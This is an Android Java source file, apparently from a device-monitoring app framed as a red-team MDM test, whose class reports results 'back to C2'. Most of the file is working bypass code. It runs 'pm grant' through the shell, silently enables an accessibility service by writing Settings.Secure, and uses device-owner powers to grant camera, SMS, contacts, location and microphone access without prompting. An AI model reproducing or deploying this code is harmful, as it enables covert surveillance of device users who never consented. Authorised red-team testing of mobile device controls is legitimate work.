package com.familyshield.device.guard;

import android.app.admin.DevicePolicyManager;
import android.content.*;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import java.io.*;
import java.util.*;

/**
 * Tries every available permission / accessibility bypass method.
 * Reports what succeeded and what was blocked back to C2.
 *
 * This is the core of the red team test:
 *   PASSED  = bypass worked, MDM did NOT block → finding for SOC
 *   BLOCKED = MDM/restriction system caught it → control is working
 */
public class PermissionHelper {

    private static final String TAG = "PermHelper";

    private static final String[] TEST_PERMISSIONS = {
        android.Manifest.permission.CAMERA,
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.READ_EXTERNAL_STORAGE,
        android.Manifest.permission.RECORD_AUDIO,
    };

    /**
     * Run all bypass attempts. Returns a multi-line report.
     */
    public static String runAllTests(Context ctx) {
        StringBuilder sb = new StringBuilder();
        sb.append("=== ACCESS DIAGNOSTIC ===\n");
        sb.append("Device: ").append(Build.MANUFACTURER).append(" ").append(Build.MODEL).append("\n");
        sb.append("Android: ").append(Build.VERSION.RELEASE).append(" SDK ").append(Build.VERSION.SDK_INT).append("\n\n");

        // Test 1: Current permission state (what was already granted)
        sb.append("--- [1] CURRENT PERMISSION STATE ---\n");
        for (String perm : TEST_PERMISSIONS) {
            boolean granted = ctx.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED;
            String shortPerm = perm.substring(perm.lastIndexOf('.') + 1);
            sb.append(granted ? "[GRANTED] " : "[DENIED]  ").append(shortPerm).append("\n");
        }

        // Test 2: Accessibility service state
        sb.append("\n--- [2] ACCESSIBILITY SERVICE STATE ---\n");
        boolean accEnabled = isAccessibilityEnabled(ctx);
        sb.append(accEnabled ? "[ENABLED]  accessibility monitor is active\n"
                             : "[DISABLED] accessibility monitor not active\n");

        // Test 3: Device admin state
        sb.append("\n--- [3] DEVICE ADMIN STATE ---\n");
        boolean isAdmin = isDeviceAdmin(ctx);
        sb.append(isAdmin ? "[ACTIVE]   App is Device Admin — elevated privileges available\n"
                          : "[INACTIVE] Not Device Admin — ADB or manual activation needed\n");

        // Test 4: Device owner (highest privilege — set by MDM or ADB)
        sb.append("\n--- [4] DEVICE OWNER STATE ---\n");
        boolean isOwner = isDeviceOwner(ctx);
        sb.append(isOwner ? "[ACTIVE]   App is Device Owner — can silently grant ALL permissions\n"
                          : "[INACTIVE] Not Device Owner\n");

        // Test 5: Try shell pm grant (works only if ADB/root granted it, or running as system)
        sb.append("\n--- [5] SHELL pm grant BYPASS ATTEMPT ---\n");
        String pkg = ctx.getPackageName();
        for (String perm : new String[]{
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.READ_SMS}) {
            String shortPerm = perm.substring(perm.lastIndexOf('.') + 1);
            String result = tryShellGrant(pkg, perm);
            sb.append("[").append(shortPerm).append("] ").append(result).append("\n");
        }

        // Test 6: Try to enable accessibility via settings write
        sb.append("\n--- [6] SILENT ACCESSIBILITY ENABLE ATTEMPT ---\n");
        String accResult = tryEnableAccessibility(ctx);
        sb.append(accResult).append("\n");

        // Test 7: Device owner can grant permissions silently
        if (isOwner) {
            sb.append("\n--- [7] DEVICE OWNER SILENT GRANT ---\n");
            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(ctx, DeviceAdminReceiver.class);
            for (String perm : TEST_PERMISSIONS) {
                try {
                    dpm.setPermissionGrantState(admin, ctx.getPackageName(), perm,
                            DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED);
                    boolean now = ctx.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED;
                    String shortPerm = perm.substring(perm.lastIndexOf('.') + 1);
                    sb.append(now ? "[OPEN]    " : "[BLOCKED] ").append(shortPerm).append("\n");
                } catch (Exception e) {
                    sb.append("[ERROR]    ").append(perm).append(": ").append(e.getMessage()).append("\n");
                }
            }
        }

        sb.append("\n=== END DIAGNOSTIC ===\n");
        sb.append("Finding: any [OPEN] or [GRANTED] entry above = security gap\n");
        return sb.toString();
    }

    // ── helpers ───────────────────────────────────────────────────────────────

    private static String tryShellGrant(String pkg, String perm) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"pm", "grant", pkg, perm});
            p.waitFor();
            int exit = p.exitValue();
            return exit == 0 ? "OPEN — pm grant succeeded (ADB/root active)" : "BLOCKED  — pm grant returned exit " + exit;
        } catch (Exception e) {
            return "BLOCKED  — " + e.getMessage();
        }
    }

    private static String tryEnableAccessibility(Context ctx) {
        String service = ctx.getPackageName() + "/.AccessibilityHelperService";
        try {
            // This requires WRITE_SECURE_SETTINGS — only works as system/device owner/adb
            Settings.Secure.putString(ctx.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, service);
            Settings.Secure.putInt(ctx.getContentResolver(),
                    Settings.Secure.ACCESSIBILITY_ENABLED, 1);
            boolean check = isAccessibilityEnabled(ctx);
            return check ? "OPEN — enabled via Settings.Secure"
                         : "BLOCKED  — Settings.Secure write denied";
        } catch (SecurityException e) {
            return "BLOCKED  — SecurityException (WRITE_SECURE_SETTINGS denied — MDM is working)";
        } catch (Exception e) {
            return "BLOCKED  — " + e.getMessage();
        }
    }

    private static boolean isAccessibilityEnabled(Context ctx) {
        try {
            String enabled = Settings.Secure.getString(
                    ctx.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return enabled != null && enabled.contains(ctx.getPackageName());
        } catch (Exception e) { return false; }
    }

    private static boolean isDeviceAdmin(Context ctx) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(ctx, DeviceAdminReceiver.class);
            return dpm != null && dpm.isAdminActive(admin);
        } catch (Exception e) { return false; }
    }

    private static boolean isDeviceOwner(Context ctx) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            return dpm != null && dpm.isDeviceOwnerApp(ctx.getPackageName());
        } catch (Exception e) { return false; }
    }
}
